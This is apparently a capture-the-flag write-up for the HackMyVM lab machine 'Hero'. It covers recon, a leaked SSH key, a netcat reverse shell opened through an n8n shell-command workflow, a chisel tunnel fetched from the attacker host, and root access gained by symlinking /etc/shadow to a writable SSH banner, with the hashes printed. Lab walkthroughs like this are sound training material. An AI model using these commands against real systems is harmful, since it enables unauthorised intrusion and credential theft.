# Hero



## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.65:80
Open 10.0.2.65:5678
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.65

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack nginx
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
5678/tcp open  rrac?   syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=86400
|     Last-Modified: Tue, 30 Sep 2025 18:32:58 GMT
|     ETag: W/"7b7-1999be62faa"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 1975
|     Vary: Accept-Encoding
|     Date: Tue, 30 Sep 2025 18:35:56 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <script type="module" crossorigin src="/assets/polyfills-DfOJfMlf.js"></script>
|     <meta charset="utf-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="viewport" content="width=device-width,initial-scale=1.0" />
|     <link rel="icon" href="/favicon.ico" />
|     <style>@media (prefers-color-scheme: dark) { body { background-color: rgb(45, 46, 46) } }</style>
|     <script type="text/javascript">
|     window.BASE_PATH = '/';
|     window.REST_ENDPOINT = 'rest';
|     </script>
|     <script src="/rest/sentry.js"></script>
|     <script>!function(t,e){var o,n,
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Vary: Accept-Encoding
|     Date: Tue, 30 Sep 2025 18:35:56 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```
```
:::

## HTTP (80)

Hm?
```bash
â””â”€$ curl 10.0.2.65
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L
UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg
AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75
BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=
-----END OPENSSH PRIVATE KEY-----
```

We have SSH key, but no SSH port ðŸ˜³
```bash
â””â”€$ curl 10.0.2.65 -so id_rsa
â””â”€$ chmod 600 id_rsa
â””â”€$ ssh-keygen -lf id_rsa
256 SHA256:4Bu9VvimE5IW8+f93tPh3/jpwc1VHy3wP4lpeV3S3SQ shawa@hero (ED25519)
```

## HTTP (5678)

Create a user

![writeup.png](/assets/pentest/hackmyvm/hero/writeup.png)

[N8N](https://n8n.io/): Automate Workflows with AI â€”Â _n8n_Â is a workflow automation platform that uniquely combines AI capabilities with business

Create workflow from scratch, we can execute Shell Commands so why not

![writeup-1.png](/assets/pentest/hackmyvm/hero/writeup-1.png)

You can test commands in pseudo interactive way

![writeup-2.png](/assets/pentest/hackmyvm/hero/writeup-2.png)

## Reverse Shell (n8n)

```bash
busybox nc 10.0.2.15 4444 -e /bin/ash
```

> **Note**: I wasn't able to spawn TTY so I'll just denote commands with `> `

```bash
â””â”€$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.65:38555.
> id
uid=1000(node) gid=1000(node) groups=1000(node)

> netstat -anlp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN      7/node
tcp        0      0 172.17.0.2:5678         10.0.2.15:57882         ESTABLISHED 7/node
tcp        0      0 172.17.0.2:38555        10.0.2.15:4444          ESTABLISHED 44/ash
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
unix  3      [ ]         STREAM     CONNECTED      16096 44/ash
unix  3      [ ]         STREAM     CONNECTED      16095 7/node
unix  2      [ ]         STREAM     CONNECTED      16091 7/node

> ip a s
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

> busybox nc -zv 172.17.0.1 22 2>&1
172.17.0.1 (172.17.0.1:22) open
```

On network we are `.2` so `.1` should be another container or host on docker network.

```bash
â””â”€$ chisel server --reverse -p 36000
---
> cd /tmp
> wget 10.0.2.15/chisel
> chmod +x chisel
> /tmp/chisel client 10.0.2.15:36000 R:2222:172.17.0.1:22 &
```

## SSH (Internal)

```bash
â””â”€$ ssh -i id_rsa shawa@0 -p 2222
hero:~$ id
uid=1000(shawa) gid=1000(shawa) groups=1000(shawa)
```

### User.txt

```
hero:~$ cat user.txt
HMVOHIMNOTREAL
```

## Privilege Escalation

There's a `banner.txt` in `/opt`
```bash
hero:~$ cat /opt/banner.txt
shawa was here.
```

```bash
hero:~$ cat /etc/ssh/sshd_config | grep Banner
Banner /opt/banner.txt
```

We can read and write file
```bash
hero:~$ ls -alh /opt/banner.txt
-rw-rw-rw-    1 root     root          16 Feb  6  2025 /opt/banner.txt
```

Change banner to something else
```bash
hero:~$ ln -sf /etc/shadow /opt/banner.txt
```

```bash
â””â”€$ ssh -i id_rsa shawa@0 -p 2222
#Imthepassthaty0uwant!
root:$6$WBuW3zyLro0fagui$gq9zWbt3gEpo26gkIjtgjYZqjCJtjJrJO9EHaWkglVZWwWhQiiSNmMGejRn.Q58Z9knsWP59OQqLPgt2NAWd80:20125:0:::::
...
shawa:$6$24FnSb8jAyKUSa4W$Z7fiPgCy1q8VTg6eF0tVe2cjlHfZEB.fswQyBWoZdY3PwV6VyckxP8OhskWf/Kgx881HhsT2uWvVPTGRpJ43T.:20125:0:99999:7:::
hero:~$ su
Password: Imthepassthaty0uwant!
/home/shawa # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

> Creds: `root:Imthepassthaty0uwant!`

### Root.txt

```
/home/shawa # cat /root/root.txt
HMVNOTINPRODLOL
```